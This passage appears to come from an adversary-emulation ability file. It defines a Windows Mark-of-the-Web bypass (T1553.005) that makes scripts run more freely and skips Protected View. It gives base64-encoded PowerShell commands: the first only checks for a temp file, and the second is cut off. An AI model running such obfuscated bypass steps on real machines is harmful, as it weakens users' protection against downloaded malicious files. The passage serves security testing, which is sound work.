    Removing this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.'
  tactic: defense-impairment
  technique:
    attack_id: T1553.005
    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgB0AG0AcABcAFIAZQBhAGQATQBlAC4AbQBkACkAIAB7ACAARQBYAEkAVAAgADAAIAB9ACAAZQBsAHMAZQAgAHsAIABFAFgASQBUACAAMQAgAH0ACgA=
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
